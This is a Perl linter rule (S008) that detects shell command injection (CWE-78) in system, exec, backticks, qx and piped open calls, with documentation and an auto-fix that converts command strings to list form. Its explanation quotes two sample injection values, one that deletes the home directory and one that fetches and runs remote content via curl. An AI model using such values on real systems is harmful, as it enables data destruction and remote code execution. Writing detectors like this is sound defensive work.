package Puff::Rule::Security::ShellCommand;

use v5.36;
use parent 'Puff::Rule';

use Puff::PPIUtil qw( is_builtin_call call_args is_constant_string command_body shell_syntax $PERL_SHELL_META );

my %SHELL_FUNCTION = map { $_ => 1 } qw( system exec readpipe CORE::system CORE::exec CORE::readpipe );
my %SYSTEM         = map { $_ => 1 } qw( system CORE::system );

# A shell or remote shell anywhere (`sudo sh -c ...`) keeps the injection
my %SHELL_PROGRAM = map { $_ => 1 } qw( sh ash bash dash zsh ksh mksh rbash csh tcsh fish busybox ssh rsh su );

# $name, $Pkg::name, ${name} or $1, read the same in code as in a string
my $SCALAR = qr/\$(?:\d+|[A-Za-z_]\w*(?:::\w+)*|\{\w+\})/a;

sub code       {'S008'}
sub summary    {'Do not pass a command built at runtime to the shell'}
sub cwe        {78}
sub fix_safety {'unsafe'}

sub applies_to {
    return [ 'PPI::Token::Word', 'PPI::Token::QuoteLike::Backtick', 'PPI::Token::QuoteLike::Command' ];
}

sub explanation {
    return <<~'END';
        When system, exec, backticks, qx or a piped open get the whole command
        as one string, Perl hands it to /bin/sh whenever it contains shell
        metacharacters. A value inside that string such as `x; rm -rf ~` or
        `$(curl evil)` then runs as a command of its own (CWE-78).

        The rule reports:

        - `system`, `exec` and `readpipe` with a single argument that is not a
          constant string: an interpolating string (`system("tar xf $file")`),
          a concatenation, or a scalar variable (`system($cmd)`);
        - backticks and `qx{...}` that interpolate a variable;
        - three-argument `open` with mode `-|` or `|-` and one command string
          that is not constant.

        Pass the program and its arguments as a list, which skips the shell:

            system( 'tar', 'xf', $file ) == 0 or die "tar failed: $?";
            open( my $fh, '-|', 'git', 'log', $ref ) or die $!;

        For captured output, use IPC::Run3, IPC::System::Simple's capturex
        or Capture::Tiny around the list form of system. `system { $prog }
        @args` and `system(@cmd)` are not reported. Two-argument piped opens
        are reported by S002. A constant command string with shell syntax is
        reported by S018, which is selected only by its code.

        The unsafe fix splits one interpolating string given to `system` or
        `exec` into a list, keeping a leading Win32 spawn mode:

            system "tar -czf $out $src";    # becomes
            system 'tar', '-czf', $out, $src;

        It splits on ASCII whitespace. A plain word becomes a single-quoted
        string, a word that is one simple scalar (`$name`, `$Pkg::name`,
        `${name}`) becomes that variable, and a word mixing the two stays
        double-quoted (`"backup-$date.tgz"`). Perl then starts no shell, but
        a program that runs one itself still interprets its arguments, so a
        command that names a shell anywhere (such as `sh`, `bash`, `ssh` or
        `su`, by basename, also after `sudo` or `env`) is declined. Unlike a
        constant string, this split changes behaviour, which is why the fix
        is unsafe: each value now arrives as exactly one argument, so one
        that held several words (`my $opts = '-v -n'`), was empty, relied on
        the shell (a glob such as `*.txt`) or was already quoted for it
        (`quotemeta`, `shell_quote`) behaves differently, and a scalar used
        as the program (`"$prog $arg"`) cannot be checked for a shell. It
        removes shell injection, not option injection: a value starting with
        `-` is still an option, so use `--` or validate it.

        The fix is also declined when, apart from the simple scalars, the
        string has shell syntax as S018 defines it, an `@`, an escape or a
        trailing `2>&1`, or when it has fewer than two words. Every other
        form (heredocs, concatenations, variables, backticks, `qx`,
        `readpipe`, piped opens) is report-only.

        A leading 0 or 1 is the Win32 spawn mode (0 waits, 1 spawns
        asynchronously), so the call is judged by the arguments after it. On
        Unix it would run a program named after the number.

        On Win32 the child gets one command line and parses it itself, so the
        list form is emulated and some quoting problems survive it. `system
        LIST` also falls back to the shell if the first spawn fails, so only
        `system { $prog } @args` reliably avoids the shell there (perlfunc).

        A lone program path that may contain spaces (`system $path`) should
        be written `system { $path } $path`; parentheses change nothing.

        Ruff's equivalents are S602, S605 and S607.
        END
}

sub check ( $self, $elem, $doc ) {
    if ( $elem->isa('PPI::Token::QuoteLike') ) {
        my ( undef, $interpolates ) = command_body($elem);
        return unless $interpolates;
        return $self->violation(
            $elem,
            message => 'Interpolated command runs through the shell (CWE-78); use the list form of system or IPC::Run3',
            fixable => 0,
        );
    }

    my $name = $elem->content;
    if ( $SHELL_FUNCTION{$name} && is_builtin_call($elem) ) {
        my $next = $elem->snext_sibling;
        return if $next && $next->isa('PPI::Structure::Block');
        my $args = _command_args($elem);
        return unless @$args == 1 && _is_shell_string( $args->[0] );
        ( my $short = $name ) =~ s/\ACORE:://;
        return $self->violation(
            $elem,
            message => "$short with one string runs it through the shell (CWE-78); pass the command as a list",
            fixable => $short ne 'readpipe' && defined _as_list( $args->[0] ) ? 1 : 0,
        );
    }

    if ( $name eq 'open' && is_builtin_call($elem) ) {
        my $args = call_args($elem);
        return unless @$args == 3 && @{ $args->[1] } == 1 && is_constant_string( $args->[1][0] );

        # /a: perl takes only ASCII whitespace around an open mode
        return unless $args->[1][0]->string =~ /\A\s*(?:-\||\|-)\s*\z/a;
        return unless _is_shell_string( $args->[2] );
        return $self->violation(
            $elem,
            message =>
                'Piped open with one command string runs it through the shell (CWE-78); pass the command as a list',
            fixable => 0,
        );
    }
    return;
}

sub fix ( $self, $violation, $fix ) {
    my $args = _command_args( $violation->element );
    my $text = _as_list( $args->[0] ) // return 0;
    $fix->replace( $args->[0][0], $text );
    return 1;
}

# The call's arguments, without a leading Win32 spawn mode.
sub _command_args ($elem) {
    my $args = call_args($elem);

    # Win32 takes a leading 0 or 1 as the spawn mode, not the program
    shift @$args
        if $SYSTEM{ $elem->content }
        && @$args > 1
        && @{ $args->[0] } == 1
        && $args->[0][0]->isa('PPI::Token::Number')
        && ( $args->[0][0]->literal // q{} ) =~ /\A[01]\z/;
    return $args;
}

# The list that replaces one interpolating string, or undef unless it holds
# two or more words with only simple scalars and no shell syntax, and names
# no shell.
sub _as_list ($arg) {
    return unless @$arg == 1;
    my ($quote) = @$arg;
    return unless $quote->isa('PPI::Token::Quote::Double') || $quote->isa('PPI::Token::Quote::Interpolate');

    # The source text stands in for the value: escapes and quotes are meta
    my $string = $quote->string;
    ( my $rest = $string ) =~ s/$SCALAR//g;

    # shell_syntax adds the leading `.`, `exec` and VAR= checks
    return if $rest =~ /\@/ || $rest =~ $PERL_SHELL_META || defined shell_syntax($rest);

    my @words = grep {length} split /\s+/a, $string;
    return if @words < 2 || grep { $SHELL_PROGRAM{s{.*/}{}r} } @words;
    return join ', ', map        { /\A$SCALAR\z/ ? $_ : /\$/ ? qq{"$_"} : qq{'$_'} } @words;
}

# One argument that the shell may see: anything but a constant string or an
# array.
sub _is_shell_string ($arg) {
    return 0 unless @$arg;
    my $first = $arg->[0];
    return 0 if @$arg == 1                        && is_constant_string($first);
    return 0 if $first->isa('PPI::Token::Symbol') && $first->raw_type eq '@' && @$arg == 1;
    return 0 if $first->isa('PPI::Token::Cast')   && $first->content eq '@';
    return 0 if $first->isa('PPI::Token::ArrayIndex');
    return 1;
}

1;

# ABSTRACT: S008 - do not pass a command built at runtime to the shell

__END__

=pod

=head1 DESCRIPTION

Reports one-string C<system>, C<exec> and C<readpipe> calls, interpolating
backticks and C<qx>, and three-argument piped opens with one command string
that is not constant. A leading 0 or 1 in C<system> is the Win32 spawn mode
(0 waits, 1 spawns asynchronously), so the arguments after it are judged.

The unsafe fix splits one interpolating string given to C<system> or
C<exec> into a list (C<system "tar xf $f"> becomes
C<system 'tar', 'xf', $f>): plain words are single-quoted, a word that is one
simple scalar becomes that variable, and a word mixing the two stays
double-quoted. Perl then starts no shell, but a program that runs one
itself still interprets its arguments, so a command that names a shell
anywhere (such as C<sh>, C<bash>, C<ssh> or C<su>, also after C<sudo>) is
declined. Unlike a constant string, this split changes behaviour, which is
why the fix is unsafe: each value now arrives as exactly one argument, so
one that held several words (C<my $opts = '-v -n'>), was empty, relied on
the shell (a glob such as C<*.txt>) or was already quoted for it
(C<quotemeta>, C<shell_quote>) behaves differently, and a scalar used as
the program (C<"$prog $arg">) cannot be checked for a shell. It removes shell
injection, not option injection: a value starting with C<-> is still an
option, so use C<--> or validate it. The fix is also declined when the
string, apart from its simple scalars, has shell syntax, C<@> or an escape,
or has fewer than two words. Every other form is report-only.

=cut
